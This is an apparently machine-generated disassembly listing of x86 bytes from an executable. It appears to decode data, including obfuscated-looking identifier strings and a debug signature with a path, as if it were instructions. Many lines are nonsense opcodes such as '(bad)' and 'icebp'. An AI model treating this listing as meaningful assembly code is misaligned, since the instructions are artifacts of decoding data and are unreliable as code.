  42a314:	add    cl,ch
  42a316:	mov    ds:0xa2ed0042,al
  42a31b:	inc    edx
  42a31c:	add    cl,dh
  42a31e:	mov    ds:0xa2f50042,al
  42a323:	inc    edx
  42a324:	add    cl,bh
  42a326:	mov    ds:0xa2fd0042,al
  42a32b:	inc    edx
  42a32c:	add    BYTE PTR [ecx],al
  42a32e:	mov    ds:0x6a10042,eax
  42a333:	adc    BYTE PTR [eax],al
  42a335:	sbb    BYTE PTR [edx],al
  42a337:	adc    BYTE PTR [eax],al
  42a339:	js     0x42a3b0
  42a33b:	adc    BYTE PTR [eax],al
  42a33d:	jns    0x42a358
  42a33f:	adc    BYTE PTR [eax],al
  42a341:	les    esp,FWORD PTR [eax+edx*1+0x0]
  42a345:	jmp    0x104e:0x95001007
  42a34c:	add    BYTE PTR [ebx+0x3100106c],ch
  42a352:	mov    ds:0xa3350042,eax
  42a357:	inc    edx
  42a358:	add    BYTE PTR [ecx],bh
  42a35a:	mov    ds:0xa33d0042,eax
  42a35f:	inc    edx
  42a360:	add    BYTE PTR [ecx-0x5d],al
  42a363:	inc    edx
  42a364:	add    BYTE PTR [ebp-0x5d],al
  42a367:	inc    edx
  42a368:	add    BYTE PTR [ecx-0x5d],cl
  42a36b:	inc    edx
  42a36c:	add    BYTE PTR [ebp-0x5d],cl
  42a36f:	inc    edx
  42a370:	add    BYTE PTR [ebx],al
  42a372:	add    DWORD PTR [eax],edx
  42a374:	add    BYTE PTR [esi],ch
  42a376:	jg     0x42a388
  42a378:	add    BYTE PTR [eax+ebp*2],cl
  42a37b:	adc    BYTE PTR [eax],al
  42a37d:	lds    edi,FWORD PTR [eax+0x10]
  42a380:	add    BYTE PTR [edi+0x44],cl
  42a383:	adc    BYTE PTR [eax],al
  42a385:	xchg   BYTE PTR [ecx],cl
  42a387:	adc    BYTE PTR [eax],al
  42a389:	(bad)  
  42a38a:	pop    ds
  42a38b:	adc    BYTE PTR [eax],al
  42a38d:	xlat   BYTE PTR ds:[ebx]
  42a38e:	push   esp
  42a38f:	adc    BYTE PTR [eax],al
  42a391:	jno    0x42a336
  42a393:	inc    edx
  42a394:	add    BYTE PTR [ebp-0x5d],dh
  42a397:	inc    edx
  42a398:	add    BYTE PTR [ecx-0x5d],bh
  42a39b:	inc    edx
  42a39c:	add    BYTE PTR [ebp-0x5d],bh
  42a39f:	inc    edx
  42a3a0:	add    BYTE PTR [ecx-0x7affbd5d],al
  42a3a6:	mov    ds:0xa3890042,eax
  42a3ab:	inc    edx
  42a3ac:	add    BYTE PTR [ebp-0x73ffbd5d],cl
  42a3b2:	ja     0x42a3c4
  42a3b4:	add    BYTE PTR [ecx+0x6800104f],dl
  42a3ba:	sbb    DWORD PTR [eax],edx
  42a3bc:	add    BYTE PTR [ebx-0x74ffefbf],bl
  42a3c2:	add    eax,0x5b120010
  42a3c7:	adc    BYTE PTR [eax],al
  42a3c9:	scas   al,BYTE PTR es:[edi]
  42a3ca:	xor    DWORD PTR [eax],edx
  42a3cc:	add    BYTE PTR [edi-0x4effefca],dh
  42a3d2:	mov    ds:0xa3b50042,eax
  42a3d7:	inc    edx
  42a3d8:	add    BYTE PTR [ecx-0x42ffbd5d],bh
  42a3de:	mov    ds:0xa3c10042,eax
  42a3e3:	inc    edx
  42a3e4:	add    ch,al
  42a3e6:	mov    ds:0xa3c90042,eax
  42a3eb:	inc    edx
  42a3ec:	add    ch,cl
  42a3ee:	mov    ds:0x2f060042,eax
  42a3f3:	adc    BYTE PTR [eax],al
  42a3f5:	fs push edi
  42a3f7:	adc    BYTE PTR [eax],al
  42a3f9:	lods   al,BYTE PTR ds:[esi]
  42a3fa:	inc    ebp
  42a3fb:	adc    BYTE PTR [eax],al
  42a3fd:	pop    ds
  42a3fe:	push   es
  42a3ff:	adc    BYTE PTR [eax],al
  42a401:	xchg   ebp,eax
  42a402:	push   ds
  42a403:	adc    BYTE PTR [eax],al
  42a405:	mov    bh,0x14
  42a407:	adc    BYTE PTR [eax],al
  42a409:	repz dec esp
  42a40b:	adc    BYTE PTR [eax],al
  42a40d:	enter  0x1008,0x0
  42a411:	icebp  
  42a412:	mov    ds:0xa3f50042,eax
  42a417:	inc    edx
  42a418:	add    cl,bh
  42a41a:	mov    ds:0xa3fd0042,eax
  42a41f:	inc    edx
  42a420:	add    BYTE PTR [ecx],al
  42a422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a423:	inc    edx
  42a424:	add    BYTE PTR ds:0x90042a4,al
  42a42a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a42b:	inc    edx
  42a42c:	add    BYTE PTR ds:0x550042a4,cl
  42a432:	xor    BYTE PTR [edx+0x39],cl
  42a435:	pop    edi
  42a436:	push   ecx
  42a437:	cmp    BYTE PTR [edx+0x38],bl
  42a43a:	push   edx
  42a43b:	add    BYTE PTR [ebp+0x59],cl
  42a43e:	inc    ebx
  42a43f:	cmp    DWORD PTR [edi+0x46],ebx
  42a442:	inc    ebp
  42a443:	xor    eax,0x5958535f
  42a448:	add    BYTE PTR [esi+0x30],dl
  42a44b:	push   esi
  42a44c:	xor    DWORD PTR [edi+0x33],ebx
  42a44f:	dec    esp
  42a450:	push   ebx
  42a451:	push   ebx
  42a452:	xor    esi,DWORD PTR ds:0x59003135
  42a458:	push   eax
  42a459:	inc    ebp
  42a45a:	xor    dh,BYTE PTR [edi]
  42a45c:	pop    edi
  42a45d:	xor    DWORD PTR [ebx+0x45],eax
  42a460:	add    BYTE PTR [eax+0x30],bl
  42a463:	dec    edi
  42a464:	pop    edi
  42a465:	push   eax
  42a466:	xor    BYTE PTR [ebx],dh
  42a468:	pop    ecx
  42a469:	xor    eax,0x57585f
  42a46e:	push   edi
  42a46f:	dec    ebx
  42a470:	aaa    
  42a471:	cmp    DWORD PTR [edi+0x50],ebx
  42a474:	dec    ecx
  42a475:	push   edi
  42a476:	pop    edi
  42a477:	cmp    DWORD PTR [edx],esi
  42a479:	dec    esp
  42a47a:	add    BYTE PTR [edi+0x54],cl
  42a47d:	xor    ebx,DWORD PTR [edi+0x43]
  42a480:	pop    eax
  42a481:	inc    edx
  42a482:	xor    BYTE PTR [edi+0x32],bl
  42a485:	aaa    
  42a486:	cmp    BYTE PTR [eax],dh
  42a488:	dec    esp
  42a489:	add    BYTE PTR [edx+0x32],al
  42a48c:	inc    ecx
  42a48d:	pop    edi
  42a48e:	pop    ecx
  42a48f:	inc    ebx
  42a490:	xor    eax,0x32335f37
  42a495:	inc    esp
  42a496:	add    BYTE PTR [esi+0x4b],cl
  42a499:	xor    eax,0x5158565f
  42a49e:	xor    al,0x5f
  42a4a0:	dec    ecx
  42a4a1:	inc    edx
  42a4a2:	aaa    
  42a4a3:	aaa    
  42a4a4:	add    BYTE PTR [ecx+0x41],cl
  42a4a7:	aaa    
  42a4a8:	pop    edi
  42a4a9:	push   edx
  42a4aa:	pop    ecx
  42a4ab:	xor    edx,DWORD PTR [edx+0x48]
  42a4ae:	pop    edi
  42a4af:	inc    ebp
  42a4b0:	dec    esp
  42a4b1:	dec    ecx
  42a4b2:	inc    ecx
  42a4b3:	add    BYTE PTR ss:[edx+0x34],dl
  42a4b7:	dec    ebx
  42a4b8:	aaa    
  42a4b9:	pop    edi
  42a4ba:	inc    ecx
  42a4bb:	dec    edx
  42a4bc:	inc    esp
  42a4bd:	pop    edi
  42a4be:	xor    BYTE PTR [esi],dh
  42a4c0:	pop    eax
  42a4c1:	inc    edi
  42a4c2:	xor    DWORD PTR [ebx+0x0],ecx
  42a4c5:	dec    edi
  42a4c6:	xor    DWORD PTR ss:[ecx],esi
  42a4c9:	pop    edi
  42a4ca:	xor    eax,0x304e4f58
  42a4cf:	cmp    DWORD PTR [esi+0x0],eax
  42a4d2:	dec    esp
  42a4d3:	dec    edx
  42a4d4:	cmp    BYTE PTR [edi+0x36],bl
  42a4d7:	xor    BYTE PTR [edi+0x36],dl
  42a4da:	cmp    BYTE PTR [eax],al
  42a4dc:	pop    edx
  42a4dd:	xor    al,BYTE PTR [edx+0x5f]
  42a4e0:	push   esp
  42a4e1:	pop    edx
  42a4e2:	xor    eax,0x4b003955
  42a4e7:	cmp    DWORD PTR [ecx+0x5f],ebx
  42a4ea:	cmp    BYTE PTR [ecx],dh
  42a4ec:	push   edi
  42a4ed:	inc    ecx
  42a4ee:	pop    edi
  42a4ef:	push   edi
  42a4f0:	dec    esp
  42a4f1:	ss pop edi
  42a4f3:	dec    ecx
  42a4f4:	inc    esp
  42a4f5:	add    BYTE PTR [edx+0x56],al
  42a4f8:	xor    DWORD PTR [edi+0x43],ebx
  42a4fb:	push   eax
  42a4fc:	inc    esi
  42a4fd:	inc    ebp
  42a4fe:	pop    edi
  42a4ff:	push   esi
  42a500:	add    BYTE PTR [ebx+eax*2+0x53],dl
  42a504:	pop    edi
  42a505:	xor    cl,BYTE PTR [esi+0x33]
  42a508:	pop    edi
  42a509:	push   esi
  42a50a:	add    BYTE PTR [esi+0x43],al
  42a50d:	xor    BYTE PTR [edi],dh
  42a50f:	pop    edi
  42a510:	push   edx
  42a511:	dec    esp
  42a512:	pop    ecx
  42a513:	pop    edi
  42a514:	inc    edi
  42a515:	dec    ebx
  42a516:	inc    ebp
  42a517:	add    BYTE PTR [ebp+0x31],al
  42a51a:	aaa    
  42a51b:	pop    edi
  42a51c:	push   ebp
  42a51d:	push   edx
  42a51e:	dec    ebx
  42a51f:	aaa    
  42a520:	pop    edi
  42a521:	xor    dl,BYTE PTR [edx+0x0]
  42a524:	push   edx
  42a525:	xor    DWORD PTR [edi+0x32],edx
  42a528:	xor    al,0x5f
  42a52a:	inc    ebx
  42a52b:	inc    ecx
  42a52c:	push   edi
  42a52d:	dec    edx
  42a52e:	pop    edi
  42a52f:	push   esi
  42a530:	dec    esp
  42a531:	inc    esi
  42a532:	add    BYTE PTR [ebp+0x45],al
  42a535:	push   ebp
  42a536:	pop    edi
  42a537:	dec    edi
  42a538:	dec    esp
  42a539:	aaa    
  42a53a:	pop    edi
  42a53b:	dec    esi
  42a53c:	add    BYTE PTR ss:[edi+0x44],cl
  42a540:	pop    ecx
  42a541:	pop    edi
  42a542:	dec    ebp
  42a543:	inc    edx
  42a544:	pop    ecx
  42a545:	push   esi
  42a546:	add    BYTE PTR [edx+0x36],al
  42a549:	ss pop edi
  42a54b:	aaa    
  42a54c:	inc    esp
  42a54d:	xor    DWORD PTR [eax+0x50],edx
  42a550:	xor    eax,0x494a5200
  42a555:	pop    edi
  42a556:	dec    eax
  42a557:	push   ebp
  42a558:	xor    BYTE PTR [edi+0x30],bl
  42a55b:	add    BYTE PTR [ecx+0x4d],bl
  42a55e:	pop    eax
  42a55f:	pop    edi
  42a560:	push   eax
  42a561:	inc    esp
  42a562:	dec    ebp
  42a563:	aaa    
  42a564:	inc    edi
  42a565:	pop    edi
  42a566:	push   ecx
  42a567:	push   ebx
  42a568:	add    BYTE PTR [ecx+0x0],dl
  42a56b:	dec    edi
  42a56c:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42a570:	add    BYTE PTR [ecx+0x0],bl
  42a573:	xor    BYTE PTR [eax],al
  42a575:	push   ebx
  42a576:	add    BYTE PTR [edi],dh
  42a578:	add    BYTE PTR [ebp+0x0],dl
  42a57b:	add    BYTE PTR [eax],al
  42a57d:	inc    ecx
  42a57e:	add    BYTE PTR [esi+0x0],cl
  42a581:	push   ebp
  42a582:	add    BYTE PTR [edx],dh
  42a584:	add    BYTE PTR [edi+0x0],bl
  42a587:	inc    edi
  42a588:	add    BYTE PTR [eax+eax*1],dh
  42a58b:	dec    ebp
  42a58c:	add    BYTE PTR [eax],dh
  42a58e:	add    BYTE PTR [edi+0x0],bl
  42a591:	inc    esi
  42a592:	add    BYTE PTR [esi],dh
  42a594:	add    BYTE PTR [eax],al
  42a596:	add    BYTE PTR [ebx+0x0],al
  42a599:	dec    ecx
  42a59a:	add    BYTE PTR [eax],dh
  42a59c:	add    BYTE PTR [edi+0x0],bl
  42a59f:	push   ecx
  42a5a0:	add    BYTE PTR [edx+0x0],dl
  42a5a3:	add    BYTE PTR ss:[ebx+0x0],dl
  42a5a7:	pop    edi
  42a5a8:	add    BYTE PTR [eax+eax*1+0x4c],al
  42a5ac:	add    BYTE PTR [eax+eax*1+0x50],cl
  42a5b0:	add    BYTE PTR [eax],al
  42a5b2:	add    BYTE PTR [edx+0x0],bl
  42a5b5:	xor    BYTE PTR [eax],al
  42a5b7:	add    BYTE PTR ss:[edi+0x0],bl
  42a5bb:	dec    esp
  42a5bc:	add    BYTE PTR [ebx+0x0],dl
  42a5bf:	dec    ebx
  42a5c0:	add    BYTE PTR [ebx+0x0],dl
  42a5c3:	add    BYTE PTR [eax],al
  42a5c5:	dec    edx
  42a5c6:	add    BYTE PTR [ebx],dh
  42a5c8:	add    BYTE PTR [ecx],dh
  42a5ca:	add    BYTE PTR ds:0x5f003500,dh
  42a5d0:	add    BYTE PTR [esi+0x0],dl
  42a5d3:	push   ebx
  42a5d4:	add    BYTE PTR [eax+0x0],bl
  42a5d7:	add    BYTE PTR [eax],al
  42a5d9:	inc    esp
  42a5da:	add    BYTE PTR [ecx+0x0],al
  42a5dd:	inc    ebx
  42a5de:	add    BYTE PTR ds:0x5f003600,dh
  42a5e4:	add    BYTE PTR [ebx+0x0],al
  42a5e7:	xor    eax,0x36003700
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	add    BYTE PTR [eax+eax*1+0x54],cl
  42a5f2:	add    BYTE PTR [eax],dh
  42a5f4:	add    BYTE PTR [ebx],dh
  42a5f6:	add    BYTE PTR [eax+eax*1],dh
  42a5f9:	pop    edi
  42a5fa:	add    BYTE PTR [eax],dh
  42a5fc:	add    BYTE PTR [eax+0x0],cl
  42a5ff:	xor    eax,0x3000
  42a604:	add    BYTE PTR [edx+0x0],cl
  42a607:	push   ecx
  42a608:	add    BYTE PTR [eax+eax*1+0x5f],al
  42a60c:	add    BYTE PTR [ebx],dh
  42a60e:	add    BYTE PTR [ecx],dh
  42a610:	add    BYTE PTR [esi+0x0],al
  42a613:	cmp    BYTE PTR [eax],al
  42a615:	pop    edi
  42a616:	add    BYTE PTR [ecx],bh
  42a618:	add    BYTE PTR [esi+0x0],dl
  42a61b:	xor    BYTE PTR [eax],al
  42a61d:	push   ecx
  42a61e:	add    BYTE PTR [esi],dh
  42a620:	add    BYTE PTR [eax],al
  42a622:	add    BYTE PTR [ecx+0x0],dl
  42a625:	push   esi
  42a626:	add    BYTE PTR [edi+0x0],cl
  42a629:	xor    al,0x0
  42a62b:	pop    edi
  42a62c:	add    BYTE PTR [eax+eax*1+0x52],cl
  42a630:	add    BYTE PTR [eax+0x0],bl
  42a633:	add    BYTE PTR [eax],al
  42a635:	dec    ecx
  42a636:	add    BYTE PTR [ebp+0x0],cl
  42a639:	push   ebx
  42a63a:	add    BYTE PTR [edi+0x0],bl
  42a63d:	add    BYTE PTR ss:[edi+0x0],al
  42a641:	add    BYTE PTR ss:[eax+eax*1],dh
  42a645:	push   edi
  42a646:	add    BYTE PTR [eax],al
  42a648:	add    BYTE PTR [edi+0x0],al
  42a64b:	xor    DWORD PTR [eax],eax
  42a64d:	dec    ebp
  42a64e:	add    BYTE PTR [edi+0x0],bl
  42a651:	inc    ecx
  42a652:	add    BYTE PTR [ebx+0x0],cl
  42a655:	dec    ecx
  42a656:	add    BYTE PTR [edi+0x0],bl
  42a659:	xor    BYTE PTR [eax],al
  42a65b:	inc    edi
  42a65c:	add    BYTE PTR [ebx],dh
  42a65e:	add    BYTE PTR [eax+eax*1+0x0],dl
  42a662:	add    BYTE PTR [edi+0x0],al
  42a665:	xor    BYTE PTR [eax],al
  42a667:	dec    ebx
  42a668:	add    BYTE PTR [edi+0x0],bl
  42a66b:	aaa    
  42a66c:	add    BYTE PTR [ebp+0x0],dl
  42a66f:	inc    ebx
  42a670:	add    BYTE PTR [ebp+0x0],cl
  42a673:	dec    ebx
  42a674:	add    BYTE PTR [edi+0x0],bl
  42a677:	xor    al,0x0
  42a679:	inc    ebp
  42a67a:	add    BYTE PTR [ebx+0x0],al
  42a67d:	add    BYTE PTR [eax],al
  42a67f:	dec    edx
  42a680:	add    BYTE PTR [esi+0x0],al
  42a683:	inc    esp
  42a684:	add    BYTE PTR [edi+0x0],bl
  42a687:	inc    esi
  42a688:	add    BYTE PTR [edx+0x0],dl
  42a68b:	push   edx
  42a68c:	add    BYTE PTR [ebx+0x0],dl
  42a68f:	add    BYTE PTR [eax],al
  42a691:	add    BYTE PTR [edx+0x53],dl
  42a694:	inc    esp
  42a695:	push   ebx
  42a696:	sub    eax,DWORD PTR ds:0xfa346fed
  42a69c:	mov    BYTE PTR [ebx-0x4c],al
  42a69f:	aam    0xb4
  42a6a1:	cmp    BYTE PTR [esi],bh
  42a6a3:	fdivrp st(4),st
  42a6a5:	int3   
  42a6a6:	adc    al,0x0
  42a6a8:	add    BYTE PTR [eax],al
  42a6aa:	push   eax
  42a6ab:	cmp    bl,BYTE PTR [edx+edi*2+0x73]
  42a6af:	outs   dx,DWORD PTR ds:[esi]
  42a6b0:	inc    esi
  42a6b1:	outs   dx,BYTE PTR ds:[esi]
  42a6b2:	gs jne 0x42a729
  42a6b5:	fs addr16 jns 0x42a733
  42a6b9:	gs pop esp
  42a6bb:	outs   dx,BYTE PTR ds:[esi]
  42a6bc:	jne    0x42a72a
  42a6be:	dec    eax
  42a6bf:	push   esp
  42a6c0:	imul   ebp,DWORD PTR [ebp+0x6d],0x7a684a4d
  42a6c7:	pop    esp
  42a6c8:	jo     0x42a71a
  42a6ca:	dec    esi
  42a6cb:	jno    0x42a71c
  42a6cd:	inc    ecx
  42a6ce:	js     0x42a732
  42a6d0:	jno    0x42a747
  42a6d2:	push   0x702e6b76
  42a6d7:	bound  eax,QWORD PTR fs:[eax]
